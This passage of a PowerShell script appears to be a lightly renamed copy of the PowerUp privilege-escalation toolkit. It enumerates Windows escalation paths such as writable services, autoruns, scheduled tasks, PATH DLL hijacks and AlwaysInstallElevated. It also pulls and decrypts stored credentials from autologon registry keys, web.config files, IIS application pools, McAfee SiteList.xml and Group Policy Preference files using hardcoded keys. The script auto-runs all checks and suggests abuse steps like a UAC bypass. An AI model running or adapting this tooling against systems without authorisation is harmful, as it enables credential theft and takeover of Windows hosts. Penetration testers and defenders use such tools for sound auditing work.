$Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
$Out
}
}
}
}
catch {
Write-Verbose "Error: $_"
}
}
}
}
}

function Get-RegistryAlwaysInstallElevated {
[CmdletBinding()]
Param()
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"
if (Test-Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer") {
$HKLMval = (Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"
if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
$HKCUval = (Get-ItemProperty -Path "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"
if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
Write-Verbose "AlwaysInstallElevated enabled on this machine!"
$True
}
else{
Write-Verbose "AlwaysInstallElevated not enabled on this machine."
$False
}
}
else{
Write-Verbose "AlwaysInstallElevated not enabled on this machine."
$False
}
}
else{
Write-Verbose "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist"
$False
}
$ErrorActionPreference = $OrigError
}
function Get-RegistryAutoLogon {
[CmdletBinding()]
Param()
$AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"
if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {
$DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
$DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
$DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
$AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
$AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
$AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword
if ($DefaultUserName -or $AltDefaultUserName) {
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
$Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
$Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
$Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
$Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
$Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
$Out
}
}
}
function Get-ModifiableRegistryAutoRun {
[CmdletBinding()]
Param()
$SearchLocations = @( "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
"HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
)
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"
$SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
$Keys = Get-Item -Path $_
$ParentPath = $_
ForEach ($Name in $Keys.GetValueNames()) {
$Path = $($Keys.GetValue($Name))
$Path | Get-ModifiablePath | ForEach-Object {
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
$Out | Add-Member Noteproperty 'Path' $Path
$Out | Add-Member Noteproperty 'ModifiableFile' $_
$Out
}
}
}
$ErrorActionPreference = $OrigError
}
function Get-ModifiableScheduledTaskFile {
[CmdletBinding()]
Param()
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"
$Path = "$($ENV:windir)\System32\Tasks"
Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
try {
$TaskName = $_.Name
$TaskXML = [xml] (Get-Content $_.FullName)
if($TaskXML.Task.Triggers) {
$TaskTrigger = $TaskXML.Task.Triggers.OuterXML
$TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'TaskName' $TaskName
$Out | Add-Member Noteproperty 'TaskFilePath' $_
$Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
$Out
}
$TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'TaskName' $TaskName
$Out | Add-Member Noteproperty 'TaskFilePath' $_
$Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
$Out
}
}
}
catch {
Write-Verbose "Error: $_"
}
}
$ErrorActionPreference = $OrigError
}
function Get-UnattendedInstallFile {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"
$SearchLocations = @( "c:\sysprep\sysprep.xml",
"c:\sysprep\sysprep.inf",
"c:\sysprep.inf",
(Join-Path $Env:WinDir "\Panther\Unattended.xml"),
(Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
(Join-Path $Env:WinDir "\Panther\Unattend.xml"),
(Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
(Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
(Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
)
$SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'UnattendPath' $_
$Out
}
$ErrorActionPreference = $OrigError
}
function Get-WebConfig {
[CmdletBinding()]
Param()
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"
if (Test-Path ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {
$DataTable = New-Object System.Data.DataTable
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("dbserv")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("path")
$Null = $DataTable.Columns.Add("encr")
C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
ForEach-Object {
$CurrentVdir = $_
if ($_ -like "*%*") {
$EnvarName = "`$Env:"+$_.split("%")[1]
$EnvarValue = Invoke-Expression $EnvarName
$RestofPath = $_.split("%")[2]
$CurrentVdir = $EnvarValue+$RestofPath
}
$CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {
$CurrentPath = $_.fullname
[xml]$ConfigFile = Get-Content $_.fullname
if ($ConfigFile.configuration.connectionStrings.add) {
$ConfigFile.configuration.connectionStrings.add|
ForEach-Object {
[String]$MyConString = $_.connectionString
if($MyConString -like "*password*") {
$ConfUser = $MyConString.Split("=")[3].Split(";")[0]
$ConfPass = $MyConString.Split("=")[4].Split(";")[0]
$ConfServ = $MyConString.Split("=")[1].Split(";")[0]
$ConfVdir = $CurrentVdir
$ConfPath = $CurrentPath
$ConfEnc = "No"
$Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
}
}
}
else {
$AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe' | Sort-Object -Descending | Select-Object fullname -First 1
if (Test-Path ($AspnetRegiisPath.FullName)) {
$WebConfigPath = (Get-Item $Env:temp).FullName + "\web.config"
if (Test-Path ($WebConfigPath)) {
Remove-Item $WebConfigPath
}
Copy-Item $CurrentPath $WebConfigPath
$AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
$Null = Invoke-Expression $AspnetRegiisCmd
[xml]$TMPConfigFile = Get-Content $WebConfigPath
if ($TMPConfigFile.configuration.connectionStrings.add) {
$TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {
[String]$MyConString = $_.connectionString
if($MyConString -like "*password*") {
$ConfUser = $MyConString.Split("=")[3].Split(";")[0]
$ConfPass = $MyConString.Split("=")[4].Split(";")[0]
$ConfServ = $MyConString.Split("=")[1].Split(";")[0]
$ConfVdir = $CurrentVdir
$ConfPath = $CurrentPath
$ConfEnc = 'Yes'
$Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
}
}
}
else {
Write-Verbose "Decryption of $CurrentPath failed."
$False
}
}
else {
Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
$False
}
}
}
}
if( $DataTable.rows.Count -gt 0 ) {
$DataTable | Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
}
else {
Write-Verbose 'No connection strings found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"
if (Test-Path ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
$DataTable = New-Object System.Data.DataTable
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {
$PoolName = $_
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {
$VdirName = $_
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}
if( $DataTable.rows.Count -gt 0 ) {
$DataTable | Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
function Find-DLH{

    [CmdletBinding()]
    Param()
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_

        $ModifidablePaths = $TargetPath | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.ModifiablePath -ne $Null) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach($ModifidablePath in $ModifidablePaths) {
            if($ModifidablePath.ModifiablePath -ne $Null) {
                $ModifidablePath | Add-Member Noteproperty '%PATH%' $_
                $ModifidablePath
            }
        }
    }
}

function Get-SiteListPassword {
[CmdletBinding()]
param(
[Parameter(Position=0, ValueFromPipeline=$True)]
[ValidateScript({Test-Path -Path $_ })]
[String[]]
$Path
)
BEGIN {
function Local:Get-DecryptedSitelistPassword {
[CmdletBinding()]
Param (
[Parameter(Mandatory=$True)]
[String]
$B64Pass
)
Add-Type -Assembly System.Security
Add-Type -Assembly System.Core
$Encoding = [System.Text.Encoding]::ASCII
$SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
$3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
$XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19
$I = 0;
$UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }
$3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4
$3DES.Mode = 'ECB'
$3DES.Padding = 'None'
$3DES.Key = $3DESKey
$Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)
$Index = [Array]::IndexOf($Decrypted, [Byte]0)
if($Index -ne -1) {
$DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
}
else {
$DecryptedPass = $Encoding.GetString($Decrypted)
}
New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
}
function Local:Get-SitelistFields {
[CmdletBinding()]
Param (
[Parameter(Mandatory=$True)]
[String]
$Path
)
try {
[Xml]$SiteListXml = Get-Content -Path $Path
if($SiteListXml.InnerXml -Like "*password*") {
Write-Verbose "Potential password in found in $Path"
$SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
try {
$PasswordRaw = $_.Password.'#Text'
if($_.Password.Encrypted -eq 1) {
$DecPassword = if($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
}
else {
$DecPassword = $PasswordRaw
}
$Server = if($_.ServerIP) { $_.ServerIP } else { $_.Server }
$Path = if($_.ShareName) { $_.ShareName } else { $_.RelativePath }
$ObjectProperties = @{
'Name' = $_.Name;
'Enabled' = $_.Enabled;
'Server' = $Server;
'Path' = $Path;
'DomainName' = $_.DomainName;
'UserName' = $_.UserName;
'EncPassword' = $PasswordRaw;
'DecPassword' = $DecPassword;
}
New-Object -TypeName PSObject -Property $ObjectProperties
}
catch {
Write-Verbose "Error parsing node : $_"
}
}
}
}
catch {
Write-Warning "Error parsing file '$Path' : $_"
}
}
}
PROCESS {
if($PSBoundParameters['Path']) {
$XmlFilePaths = $Path
}
else {
$XmlFilePaths = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
}
$XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
Get-SitelistFields -Path $_.Fullname
}
}
}
function Get-CachedGPPPassword {
[CmdletBinding()]
Param()
Set-StrictMode -Version 2
Add-Type -Assembly System.Security
Add-Type -Assembly System.Core
function local:Get-DecryptedCpassword {
[CmdletBinding()]
Param (
[string] $Cpassword
)
try {
$Mod = ($Cpassword.length % 4)
switch ($Mod) {
'1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
'2' {$Cpassword += ('=' * (4 - $Mod))}
'3' {$Cpassword += ('=' * (4 - $Mod))}
}
$Base64Decoded = [Convert]::FromBase64String($Cpassword)
$AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
[Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
$AesIV = New-Object Byte[]($AesObject.IV.Length)
$AesObject.IV = $AesIV
$AesObject.Key = $AesKey
$DecryptorObject = $AesObject.CreateDecryptor()
[Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
}
catch {Write-Error $Error[0]}
}
function local:Get-GPPInnerFields {
[CmdletBinding()]
Param (
$File
)
try {
$Filename = Split-Path $File -Leaf
[XML] $Xml = Get-Content ($File)
$Cpassword = @()
$UserName = @()
$NewName = @()
$Changed = @()
$Password = @()
if ($Xml.innerxml -like "*cpassword*"){
Write-Verbose "Potential password in $File"
switch ($Filename) {
'Groups.xml' {
$Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
}
'Services.xml' {
$Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
}
'Scheduledtasks.xml' {
$Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
}
'DataSources.xml' {
$Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
}
'Printers.xml' {
$Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
}
'Drives.xml' {
$Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
$Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
}
}
}
foreach ($Pass in $Cpassword) {
Write-Verbose "Decrypting $Pass"
$DecryptedPassword = Get-DecryptedCpassword $Pass
Write-Verbose "Decrypted a password of $DecryptedPassword"
$Password += , $DecryptedPassword
}
if (-not $Password) {$Password = '[BLANK]'}
if (-not $UserName) {$UserName = '[BLANK]'}
if (-not $Changed) {$Changed = '[BLANK]'}
if (-not $NewName) {$NewName = '[BLANK]'}
$ObjectProperties = @{'Passwords' = $Password;
'UserNames' = $UserName;
'Changed' = $Changed;
'NewName' = $NewName;
'File' = $File}
$ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
Write-Verbose "The password is between {} and may be more than one value."
if ($ResultsObject) {Return $ResultsObject}
}
catch {Write-Error $Error[0]}
}
try {
$AllUsers = $Env:ALLUSERSPROFILE
if($AllUsers -notmatch 'ProgramData') {
$AllUsers = "$AllUsers\Application Data"
}
$XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
if ( -not $XMlFiles ) {
Write-Verbose 'No preference files found.'
}
else {
Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
ForEach ($File in $XMLFiles) {
Get-GppInnerFields $File.Fullname
}
}
}
catch {Write-Error $Error[0]}
}
function Invoke-SafeFunction{
[CmdletBinding()]
Param(
[Switch]
$HTMLReport
)
if($HTMLReport) {
$HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"
$Header = "<style>"
$Header = $Header + "BODY{background-color:peachpuff;}"
$Header = $Header + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
$Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
$Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
$Header = $Header + "</style>"
ConvertTo-HTML -Head $Header -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
}
"`n[*] Running Invoke-AllChecks"
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if($IsAdmin){
"[+] Current user already has local administrative privileges!"
if($HTMLReport) {
ConvertTo-HTML -Head $Header -Body "<H2>User Has Local Admin Privileges!</H2>" | Out-File -Append $HtmlReportFile
}
}
else{
"`n`n[*] Checking if user is in a local group with administrative privileges..."
$CurrentUserSids = Get-CurrentUserTokenGroupSid | Select-Object -ExpandProperty SID
if($CurrentUserSids -contains 'S-1-5-32-544') {
"[+] User is in a local group that grants administrative privileges!"
"[+] Run a BypassUAC attack to elevate privileges to admin."
if($HTMLReport) {
ConvertTo-HTML -Head $Header -Body "<H2> User In Local Group With Administrative Privileges</H2>" | Out-File -Append $HtmlReportFile
}
}
}
"`n`n[*] Checking for unquoted service paths..."
$Results = Get-ServiceUnquoted
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
}
"`n`n[*] Checking service executable and argument permissions..."
$Results = Get-ModifiableServiceFile
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>Service File Permissions</H2>" | Out-File -Append $HtmlReportFile
}
"`n`n[*] Checking service permissions..."
$Results = Get-ModifiableService
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>Modifiable Services</H2>" | Out-File -Append $HtmlReportFile
}
"`n`n[*] Checking %PATH% for potentially hijackable DLL locations..."
$Results = Find-DLH
$Results | Where-Object {$_} | Foreach-Object {
$AbuseString = "Write-HijackDll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'"
$_ | Add-Member Noteproperty 'AbuseFunction' $AbuseString
$_
} | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
}
"`n`n[*] Checking for AlwaysInstallElevated registry key..."
if (Get-RegistryAlwaysInstallElevated) {
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
$Results = $Out
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>AlwaysInstallElevated</H2>" | Out-File -Append $HtmlReportFile
}
}
"`n`n[*] Checking for Autologon credentials in registry..."
$Results = Get-RegistryAutoLogon
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
}
"`n`n[*] Checking for modifidable registry autoruns and configs..."
$Results = Get-ModifiableRegistryAutoRun
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
}
"`n`n[*] Checking for modifiable schtask files/configs..."
$Results = Get-ModifiableScheduledTaskFile
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>Modifidable Schask Files</H2>" | Out-File -Append $HtmlReportFile
}
"`n`n[*] Checking for unattended install files..."
$Results = Get-UnattendedInstallFile
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>Unattended Install Files</H2>" | Out-File -Append $HtmlReportFile
}
"`n`n[*] Checking for encrypted web.config strings..."
$Results = Get-Webconfig | Where-Object {$_}
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted 'web.config' String</H2>" | Out-File -Append $HtmlReportFile
}
"`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
$Results = Get-ApplicationHost | Where-Object {$_}
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted Application Pool Passwords</H2>" | Out-File -Append $HtmlReportFile
}
"`n`n[*] Checking for plaintext passwords in McAfee SiteList.xml files...."
$Results = Get-SiteListPassword | Where-Object {$_}
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>McAfee's SiteList.xml's</H2>" | Out-File -Append $HtmlReportFile
}
"`n"
"`n`n[*] Checking for cached Group Policy Preferences .xml files...."
$Results = Get-CachedGPPPassword | Where-Object {$_}
$Results | Format-List
if($HTMLReport) {
$Results | ConvertTo-HTML -Head $Header -Body "<H2>Cached GPP Files</H2>" | Out-File -Append $HtmlReportFile
}
"`n"
if($HTMLReport) {
"[*] Report written to '$HtmlReportFile' `n"
}
}
$Module = New-GhostModule -ModuleName PowerUpModule
$FunctionDefinitions = @(
(func kernel32 GetCurrentProcess ([IntPtr]) @())
(func advapi32 OpenProcessToken ([Bool]) @( [IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
(func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
(func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
(func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
(func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
(func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
QueryConfig = '0x00000001'
ChangeConfig = '0x00000002'
QueryStatus = '0x00000004'
EnumerateDependents = '0x00000008'
Start = '0x00000010'
Stop = '0x00000020'
PauseContinue = '0x00000040'
Interrogate = '0x00000080'
UserDefinedControl = '0x00000100'
Delete = '0x00010000'
ReadControl = '0x00020000'
WriteDac = '0x00040000'
WriteOwner = '0x00080000'
Synchronize = '0x00100000'
AccessSystemSecurity = '0x01000000'
GenericAll = '0x10000000'
GenericExecute = '0x20000000'
GenericWrite = '0x40000000'
GenericRead = '0x80000000'
AllAccess = '0x000F01FF'
} -Bitfield
$SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
SE_GROUP_ENABLED = '0x00000004'
SE_GROUP_ENABLED_BY_DEFAULT = '0x00000002'
SE_GROUP_INTEGRITY = '0x00000020'
SE_GROUP_INTEGRITY_ENABLED = '0xC0000000'
SE_GROUP_MANDATORY = '0x00000001'
SE_GROUP_OWNER = '0x00000008'
SE_GROUP_RESOURCE = '0x20000000'
SE_GROUP_USE_FOR_DENY_ONLY = '0x00000010'
} -Bitfield
$SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
Sid = field 0 IntPtr
Attributes = field 1 UInt32
}
$TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
GroupCount = field 0 UInt32
Groups = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}
$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
Invoke-SafeFunction

